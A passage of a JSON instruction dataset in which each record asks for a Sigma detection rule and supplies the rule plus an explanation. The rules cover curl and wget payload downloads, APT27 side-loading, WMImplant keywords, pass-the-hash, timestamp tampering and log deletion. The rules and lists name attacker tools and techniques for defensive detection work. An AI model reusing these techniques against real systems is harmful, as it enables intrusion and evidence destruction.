      "answer": "In order to detect file download using curl.exe, you should monitor Windows process creation logs for instances where `curl.exe` is executed. Look for command line usage of `curl.exe` that includes accessing URLs directly through IP addresses or referencing commonly used file-sharing or pasting services such as anonfiles.com, cdn.discordapp.com/attachments/, ddns.net, and several others including mediafire.com, mega.nz, pastebin.com, etc. Specifically, track the use of command lines containing 'http' indicating that HTTP protocol is being used for the file transfer. \n\nPay close attention to command lines that include flags like '-O', '--remote-name', or '--output', which are used in curl commands to save the downloaded file with a specific name or in a specific location. Further, be alert for command lines ending with file extensions such as '.ps1', '.bat', '.exe', '.vbs', '.vbe', '.hta', '.dll', and '.psm1', which indicate the types of files being downloaded. These can include scripts, executables, and libraries, which could be indicative of malicious activity if they are being sourced from untrusted or suspicious sites. \n\nIf all these conditions are met, it's indicative of a high chance that a file download is occurring using curl.exe which could be malicious in nature. It\u2019s essential to monitor these activities as they align with tactics and techniques associated with the delivery and execution of potential malicious payloads."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of DLL side-loading malware used by threat group Emissary Panda aka APT27.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of DLL side-loading malware used by threat group Emissary Panda aka APT27, you should monitor process creation events on Windows systems. Specifically, look for instances where the `sllauncher.exe` process is the parent and `svchost.exe` is the child process. Additionally, pay attention to any `svchost.exe` process not only being spawned from within the `\\AppData\\Roaming\\` directory but also having command-line arguments that include '-k'. These patterns are indicative of abnormal activity potentially tied to the noted threat group's malicious operations. Due to the nature of the attack, such detections are critical and the likelihood of false positives is low. This strategy focuses on identifying a method commonly used by attackers to load malicious DLLs by exploiting legitimate Windows processes, hence providing a direct indication of a potential compromise by the specified threat group.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sllauncher:\n        ParentImage|endswith: '\\sllauncher.exe'\n        Image|endswith: '\\svchost.exe'\n    selection_svchost:\n        ParentImage|contains: '\\AppData\\Roaming\\'\n        Image|endswith: '\\svchost.exe'\n        CommandLine|contains: '-k'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sllauncher:\n        ParentImage|endswith: '\\sllauncher.exe'\n        Image|endswith: '\\svchost.exe'\n    selection_svchost:\n        ParentImage|contains: '\\AppData\\Roaming\\'\n        Image|endswith: '\\svchost.exe'\n        CommandLine|contains: '-k'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "execution of DLL side-loading malware used by threat group Emissary Panda aka APT27",
      "answer": "In order to detect the execution of DLL side-loading malware used by threat group Emissary Panda aka APT27, you should monitor process creation events on Windows systems. Specifically, look for instances where the `sllauncher.exe` process is the parent and `svchost.exe` is the child process. Additionally, pay attention to any `svchost.exe` process not only being spawned from within the `\\AppData\\Roaming\\` directory but also having command-line arguments that include '-k'. These patterns are indicative of abnormal activity potentially tied to the noted threat group's malicious operations. Due to the nature of the attack, such detections are critical and the likelihood of false positives is low. This strategy focuses on identifying a method commonly used by attackers to load malicious DLLs by exploiting legitimate Windows processes, hence providing a direct indication of a potential compromise by the specified threat group."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect file time attribute change to hide new or changes to existing files..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect file time attribute change to hide new or changes to existing files, you should: Monitor Linux auditd logs for the execution of the `touch` command along with specific options that indicate attempts to modify file timestamps. The activity to be on the lookout for includes the execution (EXECVE) of commands, specifically focusing on the use of `touch`. Be especially vigilant for instances where `touch` is accompanied by options such as `-t`, `-acmr`, `-d`, or `-r`, as these are commonly used to alter the timestamps of files, potentially indicating an attempt to obfuscate file modifications or the presence of new, unauthorized files. The detection criteria necessitate the simultaneous occurrence of the `execve` event for the command execution and the specified arguments (`-t`, `-acmr`, `-d`, `-r`) linked with the `touch` command, pointing towards the manipulation of file timestamps. While false positives are noted as unknown, indicating that care should be taken to validate alerts, the alert level is set at medium, suggesting a moderate confidence in the suspicious nature of such activities. This monitoring strategy employs MITRE ATT&CK tactics and techniques focusing on evasion methods, particularly those involving the deception of file system data.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auditd\ndetection:\n    execve:\n        type: 'EXECVE'\n    touch:\n        - 'touch'\n    selection2:\n        - '-t'\n        - '-acmr'\n        - '-d'\n        - '-r'\n    condition: execve and touch and selection2\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: auditd\ndetection:\n    execve:\n        type: 'EXECVE'\n    touch:\n        - 'touch'\n    selection2:\n        - '-t'\n        - '-acmr'\n        - '-d'\n        - '-r'\n    condition: execve and touch and selection2\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Detect file time attribute change to hide new or changes to existing files.",
      "answer": "In order to detect file time attribute change to hide new or changes to existing files, you should: Monitor Linux auditd logs for the execution of the `touch` command along with specific options that indicate attempts to modify file timestamps. The activity to be on the lookout for includes the execution (EXECVE) of commands, specifically focusing on the use of `touch`. Be especially vigilant for instances where `touch` is accompanied by options such as `-t`, `-acmr`, `-d`, or `-r`, as these are commonly used to alter the timestamps of files, potentially indicating an attempt to obfuscate file modifications or the presence of new, unauthorized files. The detection criteria necessitate the simultaneous occurrence of the `execve` event for the command execution and the specified arguments (`-t`, `-acmr`, `-d`, `-r`) linked with the `touch` command, pointing towards the manipulation of file timestamps. While false positives are noted as unknown, indicating that care should be taken to validate alerts, the alert level is set at medium, suggesting a moderate confidence in the suspicious nature of such activities. This monitoring strategy employs MITRE ATT&CK tactics and techniques focusing on evasion methods, particularly those involving the deception of file system data."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when there is a interruption in the authentication process..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when there is an interruption in the authentication process, you should monitor Azure sign-in logs for specific error codes and descriptions that indicate such interruptions. Focus on the following conditions in the logs:\n\n1. Look for logs with a ResultType of 50097, accompanied by the description \"Device authentication is required\". This indicates a scenario where the authentication process was halted because the device trying to authenticate needs to be verified or authenticated. \n\n2. Search for logs that have a ResultType of 50155 with the description \"DeviceAuthenticationFailed\". This flag signifies that an attempt to authenticate a device has failed, which could interrupt the overall authentication flow.\n\n3. Identify logs containing a ResultType of 50158 along with the ResultDescription \"ExternalSecurityChallenge - External security challenge was not satisfied\". This points to an interruption because an external factor or requirement that is part of the authentication process was not met or satisfied.\n\nThese logs should be considered with caution as there could be unknown false positives. This means that not every instance flagged by these criteria is necessarily an indication of a malicious or intended interruption in the authentication process. The severity of finding these indicators in the logs is considered medium. \n\nThis analysis is crucial for maintaining the integrity and security of the authentication processes within Azure services. By focusing on sign-in logs and the specifics of these ResultTypes and descriptions, one can identify anomalies or interruptions that could suggest security challenges or attempts to bypass security measures.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: signinlogs\ndetection:\n    selection_50097:\n        ResultType: 50097\n        ResultDescription: 'Device authentication is required'\n    selection_50155:\n        ResultType: 50155\n        ResultDescription: 'DeviceAuthenticationFailed'\n    selection_50158:\n        ResultType: 50158\n        ResultDescription: 'ExternalSecurityChallenge - External security challenge was not satisfied'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: signinlogs\ndetection:\n    selection_50097:\n        ResultType: 50097\n        ResultDescription: 'Device authentication is required'\n    selection_50155:\n        ResultType: 50155\n        ResultDescription: 'DeviceAuthenticationFailed'\n    selection_50158:\n        ResultType: 50158\n        ResultDescription: 'ExternalSecurityChallenge - External security challenge was not satisfied'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "when there is a interruption in the authentication process.",
      "answer": "In order to detect when there is an interruption in the authentication process, you should monitor Azure sign-in logs for specific error codes and descriptions that indicate such interruptions. Focus on the following conditions in the logs:\n\n1. Look for logs with a ResultType of 50097, accompanied by the description \"Device authentication is required\". This indicates a scenario where the authentication process was halted because the device trying to authenticate needs to be verified or authenticated. \n\n2. Search for logs that have a ResultType of 50155 with the description \"DeviceAuthenticationFailed\". This flag signifies that an attempt to authenticate a device has failed, which could interrupt the overall authentication flow.\n\n3. Identify logs containing a ResultType of 50158 along with the ResultDescription \"ExternalSecurityChallenge - External security challenge was not satisfied\". This points to an interruption because an external factor or requirement that is part of the authentication process was not met or satisfied.\n\nThese logs should be considered with caution as there could be unknown false positives. This means that not every instance flagged by these criteria is necessarily an indication of a malicious or intended interruption in the authentication process. The severity of finding these indicators in the logs is considered medium. \n\nThis analysis is crucial for maintaining the integrity and security of the authentication processes within Azure services. By focusing on sign-in logs and the specifics of these ResultTypes and descriptions, one can identify anomalies or interruptions that could suggest security challenges or attempts to bypass security measures."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Collect pertinent data from the configuration files.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to collect pertinent data from the configuration files, you should monitor logs from Cisco services, particularly those related to authentication, authorization, and accounting (AAA). Look for instances where specific commands are executed, such as 'show running-config', 'show startup-config', 'show archive config', and 'more'. These commands are often used by attackers to extract valuable configuration data from the system, which could include sensitive information or details that might help in further attacks. When such activity is detected, capturing fields like the source of the command, the command set used, the user who executed it, their privilege level, and the remote address of the user can provide valuable context for analysis. However, it's important to note that these commands can also be commonly run by administrators for legitimate purposes, leading to a potential low level of false positives. This detection strategy aligns with key tactics and techniques often utilized in reconnaissance and collection phases of a cyber attack, aimed at gathering crucial information from a targeted system to facilitate further exploitation or infiltration.\n",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: cisco\n    service: aaa\ndetection:\n    keywords:\n        - 'show running-config'\n        - 'show startup-config'\n        - 'show archive config'\n        - 'more'\n    condition: keywords\nfields:\n    - src\n    - CmdSet\n    - User\n    - Privilege_Level\n    - Remote_Address\nfalsepositives:\n    - Commonly run by administrators\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: cisco\n    service: aaa\ndetection:\n    keywords:\n        - 'show running-config'\n        - 'show startup-config'\n        - 'show archive config'\n        - 'more'\n    condition: keywords\nfields:\n    - src\n    - CmdSet\n    - User\n    - Privilege_Level\n    - Remote_Address\nfalsepositives:\n    - Commonly run by administrators\nlevel: low\n",
      "question": "Collect pertinent data from the configuration files",
      "answer": "In order to collect pertinent data from the configuration files, you should monitor logs from Cisco services, particularly those related to authentication, authorization, and accounting (AAA). Look for instances where specific commands are executed, such as 'show running-config', 'show startup-config', 'show archive config', and 'more'. These commands are often used by attackers to extract valuable configuration data from the system, which could include sensitive information or details that might help in further attacks. When such activity is detected, capturing fields like the source of the command, the command set used, the user who executed it, their privilege level, and the remote address of the user can provide valuable context for analysis. However, it's important to note that these commands can also be commonly run by administrators for legitimate purposes, leading to a potential low level of false positives. This detection strategy aligns with key tactics and techniques often utilized in reconnaissance and collection phases of a cyber attack, aimed at gathering crucial information from a targeted system to facilitate further exploitation or infiltration.\n"
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting parameters used by WMImplant.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect parameters used by WMImplant, you should monitor Windows PowerShell scripts for specific signs that suggest the presence of malicious activity typical of WMImplant usage. This involves analyzing script block texts for certain keywords that indicate actions WMImplant might perform. The required environment to catch such activities includes having Script Block Logging enabled on the Windows system. The key indicators for detecting potential WMImplant activity encompass a range of operations, from user account modifications (like changing a user account with 'change_user') and command executions ('command_exec') to more specific system manipulations such as disabling or enabling Windows Remote Management ('disable_winrm', 'enable_winrm') and Digest Authentication ('disable_wdigest', 'enable_wdigest'). It also involves looking for evidence of registry modifications ('registry_mod'), remote PowerShell sessions ('remote_posh'), scheduled tasks creation ('sched_job'), service modifications ('service_mod'), process termination ('process_kill'), tracking active users ('active_users'), gathering basic system information ('basic_info'), system shutdown ('power_off'), identifying systems with no active users ('vacant_system'), and examining logon events ('logon_events'). It's important to be aware that legitimate administrative scripts might also use some of these keywords, resulting in potential false positives. Due to the serious implications of detecting such activity, this monitoring is considered to be of high importance.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - 'WMImplant'\n            - ' change_user '\n            - ' gen_cli '\n            - ' command_exec '\n            - ' disable_wdigest '\n            - ' disable_winrm '\n            - ' enable_wdigest '\n            - ' enable_winrm '\n            - ' registry_mod '\n            - ' remote_posh '\n            - ' sched_job '\n            - ' service_mod '\n            - ' process_kill '\n            # - ' process_start '\n            - ' active_users '\n            - ' basic_info '\n            # - ' drive_list '\n            # - ' installed_programs '\n            - ' power_off '\n            - ' vacant_system '\n            - ' logon_events '\n    condition: selection\nfalsepositives:\n    - Administrative scripts that use the same keywords.\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - 'WMImplant'\n            - ' change_user '\n            - ' gen_cli '\n            - ' command_exec '\n            - ' disable_wdigest '\n            - ' disable_winrm '\n            - ' enable_wdigest '\n            - ' enable_winrm '\n            - ' registry_mod '\n            - ' remote_posh '\n            - ' sched_job '\n            - ' service_mod '\n            - ' process_kill '\n            # - ' process_start '\n            - ' active_users '\n            - ' basic_info '\n            # - ' drive_list '\n            # - ' installed_programs '\n            - ' power_off '\n            - ' vacant_system '\n            - ' logon_events '\n    condition: selection\nfalsepositives:\n    - Administrative scripts that use the same keywords.\nlevel: high\n",
      "question": "parameters used by WMImplant",
      "answer": "In order to detect parameters used by WMImplant, you should monitor Windows PowerShell scripts for specific signs that suggest the presence of malicious activity typical of WMImplant usage. This involves analyzing script block texts for certain keywords that indicate actions WMImplant might perform. The required environment to catch such activities includes having Script Block Logging enabled on the Windows system. The key indicators for detecting potential WMImplant activity encompass a range of operations, from user account modifications (like changing a user account with 'change_user') and command executions ('command_exec') to more specific system manipulations such as disabling or enabling Windows Remote Management ('disable_winrm', 'enable_winrm') and Digest Authentication ('disable_wdigest', 'enable_wdigest'). It also involves looking for evidence of registry modifications ('registry_mod'), remote PowerShell sessions ('remote_posh'), scheduled tasks creation ('sched_job'), service modifications ('service_mod'), process termination ('process_kill'), tracking active users ('active_users'), gathering basic system information ('basic_info'), system shutdown ('power_off'), identifying systems with no active users ('vacant_system'), and examining logon events ('logon_events'). It's important to be aware that legitimate administrative scripts might also use some of these keywords, resulting in potential false positives. Due to the serious implications of detecting such activity, this monitoring is considered to be of high importance."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting external diskdrives or plugged in USB devices, EventID 6416 on Windows 10 or later.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect external disk drives or plugged in USB devices, EventID 6416 on Windows 10 or later, you should: Focus on monitoring security logs from Windows-operated systems, specifically looking for events that indicate the detection of an external disk drive or a USB mass storage device. There are two primary detection methods to be aware of. First, watch for logs with EventID 6416 that also mention 'DiskDrive' in the ClassName attribute. This signals that a new disk drive has been detected by the system's security measures. Alternatively, look for logs that specifically describe the new hardware with 'USB Mass Storage Device' in the DeviceDescription. This second method does not rely on the EventID and directly addresses the presence of USB mass storage devices.\n\nBe aware of possible false positives, which may include legitimate administrative activities where external devices are intentionally connected for maintenance or data transfer purposes. Given these circumstances are common, this type of monitoring is considered to have a low-level alert rating. However, it's crucial for cybersecurity defenses as it directly relates to tactics and techniques involving the initial access of systems through external devices, potentially used for delivering malware or stealing information.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 6416\n        ClassName: 'DiskDrive'\n    selection2:\n        DeviceDescription: 'USB Mass Storage Device'\n    condition: selection or selection2\nfalsepositives:\n    - Legitimate administrative activity\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 6416\n        ClassName: 'DiskDrive'\n    selection2:\n        DeviceDescription: 'USB Mass Storage Device'\n    condition: selection or selection2\nfalsepositives:\n    - Legitimate administrative activity\nlevel: low\n",
      "question": "external diskdrives or plugged in USB devices, EventID 6416 on Windows 10 or later",
      "answer": "In order to detect external disk drives or plugged in USB devices, EventID 6416 on Windows 10 or later, you should: Focus on monitoring security logs from Windows-operated systems, specifically looking for events that indicate the detection of an external disk drive or a USB mass storage device. There are two primary detection methods to be aware of. First, watch for logs with EventID 6416 that also mention 'DiskDrive' in the ClassName attribute. This signals that a new disk drive has been detected by the system's security measures. Alternatively, look for logs that specifically describe the new hardware with 'USB Mass Storage Device' in the DeviceDescription. This second method does not rely on the EventID and directly addresses the presence of USB mass storage devices.\n\nBe aware of possible false positives, which may include legitimate administrative activities where external devices are intentionally connected for maintenance or data transfer purposes. Given these circumstances are common, this type of monitoring is considered to have a low-level alert rating. However, it's crucial for cybersecurity defenses as it directly relates to tactics and techniques involving the initial access of systems through external devices, potentially used for delivering malware or stealing information."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting attack technique pass the hash which is used to move laterally inside the network.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the attack technique pass the hash which is used to move laterally inside the network, you should monitor specific events and conditions within Windows security logs. Focus on capturing event IDs 4624, which signify a successful logon, and 4625, which indicate a failed logon attempt. These events are particularly relevant when the logon type is 3, representing a network logon which is commonly used during lateral movement attempts. Additionally, the logon process name should be 'NtLmSsp', which is indicative of NTLM (NT LAN Manager) authentication, often exploited in pass the hash attacks.\n\nIt is crucial to pay attention to the originating and target workstation names in these events. The condition implies that both the workstation from where the logon attempt was made and the target computer should match your network's workstation naming conventions (referred here as '%Workstations%'). This helps in pinpointing the attempts that are specifically targeted at moving laterally within your network.\n\nHowever, it's important to exclude any logon attempts that are recorded with the target username as 'ANONYMOUS LOGON'. These might not be related to malicious activity and can lead to false positives. Speaking of which, legitimate administrator activities could also trigger these conditions and should be considered when evaluating alerts.\n\nThis focused monitoring approach, by analyzing network logon attempts via the NTLM authentication involving specific workstations, aids in discerning potential lateral movement activities facilitated by pass the hash attacks. It stands on the medium level of alert severity due to the balance between the necessity of detecting malicious activities and the potential for false positives, such as routine administrator tasks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: The successful use of PtH for lateral movement between workstations would trigger event ID 4624, a failed logon attempt would trigger an event ID 4625\ndetection:\n    selection:\n        EventID:\n            - 4624\n            - 4625\n        LogonType: 3\n        LogonProcessName: 'NtLmSsp'\n        WorkstationName: '%Workstations%'\n        ComputerName: '%Workstations%'\n    filter:\n        TargetUserName: 'ANONYMOUS LOGON'\n    condition: selection and not filter\nfalsepositives:\n    - Administrator activity\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: The successful use of PtH for lateral movement between workstations would trigger event ID 4624, a failed logon attempt would trigger an event ID 4625\ndetection:\n    selection:\n        EventID:\n            - 4624\n            - 4625\n        LogonType: 3\n        LogonProcessName: 'NtLmSsp'\n        WorkstationName: '%Workstations%'\n        ComputerName: '%Workstations%'\n    filter:\n        TargetUserName: 'ANONYMOUS LOGON'\n    condition: selection and not filter\nfalsepositives:\n    - Administrator activity\nlevel: medium\n",
      "question": "attack technique pass the hash which is used to move laterally inside the network",
      "answer": "In order to detect the attack technique pass the hash which is used to move laterally inside the network, you should monitor specific events and conditions within Windows security logs. Focus on capturing event IDs 4624, which signify a successful logon, and 4625, which indicate a failed logon attempt. These events are particularly relevant when the logon type is 3, representing a network logon which is commonly used during lateral movement attempts. Additionally, the logon process name should be 'NtLmSsp', which is indicative of NTLM (NT LAN Manager) authentication, often exploited in pass the hash attacks.\n\nIt is crucial to pay attention to the originating and target workstation names in these events. The condition implies that both the workstation from where the logon attempt was made and the target computer should match your network's workstation naming conventions (referred here as '%Workstations%'). This helps in pinpointing the attempts that are specifically targeted at moving laterally within your network.\n\nHowever, it's important to exclude any logon attempts that are recorded with the target username as 'ANONYMOUS LOGON'. These might not be related to malicious activity and can lead to false positives. Speaking of which, legitimate administrator activities could also trigger these conditions and should be considered when evaluating alerts.\n\nThis focused monitoring approach, by analyzing network logon attempts via the NTLM authentication involving specific workstations, aids in discerning potential lateral movement activities facilitated by pass the hash attacks. It stands on the medium level of alert severity due to the balance between the necessity of detecting malicious activities and the potential for false positives, such as routine administrator tasks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting deletion of tomcat WebServer logs which may indicate an attempt to destroy forensic evidence.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the deletion of Tomcat WebServer logs which may indicate an attempt to destroy forensic evidence, you should: Monitor for deletion activities targeting files on Windows systems where the target filenames suggest they are Tomcat log files. Look specifically for files within a path containing both \"\\Tomcat\" and \"\\logs\\\", and file names that include 'catalina.', '_access_log.', or 'localhost.'. It's important to be aware that legitimate deletion of these files could occur during the uninstallation of the tomcat server or during log rotation processes. Given these conditions are met, there could be a medium level of confidence in suspecting an attempt to tamper with or destroy log data as part of a cover-up activity following an intrusion or other malicious activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_delete\n    product: windows\ndetection:\n    selection:\n        TargetFilename|contains|all:\n            - '\\Tomcat'\n            - '\\logs\\'\n        TargetFilename|contains:\n            - 'catalina.'\n            - '_access_log.'\n            - 'localhost.'\n    condition: selection\nfalsepositives:\n    - During uninstallation of the tomcat server\n    - During log rotation\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_delete\n    product: windows\ndetection:\n    selection:\n        TargetFilename|contains|all:\n            - '\\Tomcat'\n            - '\\logs\\'\n        TargetFilename|contains:\n            - 'catalina.'\n            - '_access_log.'\n            - 'localhost.'\n    condition: selection\nfalsepositives:\n    - During uninstallation of the tomcat server\n    - During log rotation\nlevel: medium\n",
      "question": "deletion of tomcat WebServer logs which may indicate an attempt to destroy forensic evidence",
      "answer": "In order to detect the deletion of Tomcat WebServer logs which may indicate an attempt to destroy forensic evidence, you should: Monitor for deletion activities targeting files on Windows systems where the target filenames suggest they are Tomcat log files. Look specifically for files within a path containing both \"\\Tomcat\" and \"\\logs\\\", and file names that include 'catalina.', '_access_log.', or 'localhost.'. It's important to be aware that legitimate deletion of these files could occur during the uninstallation of the tomcat server or during log rotation processes. Given these conditions are met, there could be a medium level of confidence in suspecting an attempt to tamper with or destroy log data as part of a cover-up activity following an intrusion or other malicious activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential path traversal attempt via cmd.exe. Could indicate possible command/argument confusion/hijacking.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential path traversal attempt via cmd.exe, which could indicate possible command/argument confusion/hijacking, you should: Focus on monitoring the creation of processes on Windows systems. Specifically, look for instances where either the parent process or the process itself ends with '\\cmd.exe', or where the original file name is 'cmd.exe'. Additionally, pay attention to the command line arguments, especially if they include '/c', '/k', or '/r', which are indicators of the execution context or behavior modification of the cmd.exe process. Furthermore, be vigilant for signs of potential path traversal techniques, such as the command line containing '/../../', which attempts to move up in the directory structure in a manner that could be malicious. However, it's important to exclude activities relating to Java tools, like those that involve the command line containing '\\Tasktop\\keycloak\\bin\\/../../jre\\bin\\java', as these are known to generate false positives by innocently loading libraries in a similar pattern. This approach is significant for identifying high-risk activities that resemble or are characteristic of command injection or argument hijacking, especially in the context of cmd.exe on Windows environments.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - ParentImage|endswith: '\\cmd.exe'\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'cmd.exe'\n    selection_flags:\n        - ParentCommandLine|contains:\n            - '/c'\n            - '/k'\n            - '/r'\n        - CommandLine|contains:\n            - '/c'\n            - '/k'\n            - '/r'\n    selection_path_traversal:\n        - ParentCommandLine: '/../../'\n        - CommandLine|contains: '/../../'\n    filter_java:\n        CommandLine|contains: '\\Tasktop\\keycloak\\bin\\/../../jre\\bin\\java'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Java tools are known to produce false-positive when loading libraries\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - ParentImage|endswith: '\\cmd.exe'\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'cmd.exe'\n    selection_flags:\n        - ParentCommandLine|contains:\n            - '/c'\n            - '/k'\n            - '/r'\n        - CommandLine|contains:\n            - '/c'\n            - '/k'\n            - '/r'\n    selection_path_traversal:\n        - ParentCommandLine: '/../../'\n        - CommandLine|contains: '/../../'\n    filter_java:\n        CommandLine|contains: '\\Tasktop\\keycloak\\bin\\/../../jre\\bin\\java'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Java tools are known to produce false-positive when loading libraries\nlevel: high\n",
      "question": "potential path traversal attempt via cmd.exe. Could indicate possible command/argument confusion/hijacking",
      "answer": "In order to detect potential path traversal attempt via cmd.exe, which could indicate possible command/argument confusion/hijacking, you should: Focus on monitoring the creation of processes on Windows systems. Specifically, look for instances where either the parent process or the process itself ends with '\\cmd.exe', or where the original file name is 'cmd.exe'. Additionally, pay attention to the command line arguments, especially if they include '/c', '/k', or '/r', which are indicators of the execution context or behavior modification of the cmd.exe process. Furthermore, be vigilant for signs of potential path traversal techniques, such as the command line containing '/../../', which attempts to move up in the directory structure in a manner that could be malicious. However, it's important to exclude activities relating to Java tools, like those that involve the command line containing '\\Tasktop\\keycloak\\bin\\/../../jre\\bin\\java', as these are known to generate false positives by innocently loading libraries in a similar pattern. This approach is significant for identifying high-risk activities that resemble or are characteristic of command injection or argument hijacking, especially in the context of cmd.exe on Windows environments."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of wget to download content in a temporary directory such as \"/tmp\" or \"/var/tmp\".\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of wget to download content in a temporary directory such as \"/tmp\" or \"/var/tmp\", you should: Monitor Linux file events for instances where the application 'wget' is used to download files, specifically when these files are being saved into temporary directories like \"/tmp\" or \"/var/tmp\". It is important to note that there could be legitimate reasons for files to be downloaded into these directories, and such instances should be considered as potential false positives. The detection process relies on identifying events where the command or process name ends with '/wget' and the target filenames start with '/tmp/' or '/var/tmp/'. This monitoring activity is of a medium priority level and targets tactics and techniques related to the execution and defense evasion, which are indicated by the utilization of 'wget' for the purpose of dropping files into directories that are commonly used for temporary storage but could also be employed for malicious activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    category: file_event\ndetection:\n    selection:\n        Image|endswith: '/wget'\n        TargetFilename|startswith:\n            - '/tmp/'\n            - '/var/tmp/'\n    condition: selection\nfalsepositives:\n    - Legitimate downloads of files in the tmp folder.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    category: file_event\ndetection:\n    selection:\n        Image|endswith: '/wget'\n        TargetFilename|startswith:\n            - '/tmp/'\n            - '/var/tmp/'\n    condition: selection\nfalsepositives:\n    - Legitimate downloads of files in the tmp folder.\nlevel: medium\n",
      "question": "use of wget to download content in a temporary directory such as \"/tmp\" or \"/var/tmp\"",
      "answer": "In order to detect the use of wget to download content in a temporary directory such as \"/tmp\" or \"/var/tmp\", you should: Monitor Linux file events for instances where the application 'wget' is used to download files, specifically when these files are being saved into temporary directories like \"/tmp\" or \"/var/tmp\". It is important to note that there could be legitimate reasons for files to be downloaded into these directories, and such instances should be considered as potential false positives. The detection process relies on identifying events where the command or process name ends with '/wget' and the target filenames start with '/tmp/' or '/var/tmp/'. This monitoring activity is of a medium priority level and targets tactics and techniques related to the execution and defense evasion, which are indicated by the utilization of 'wget' for the purpose of dropping files into directories that are commonly used for temporary storage but could also be employed for malicious activities."
    }
  },
  {
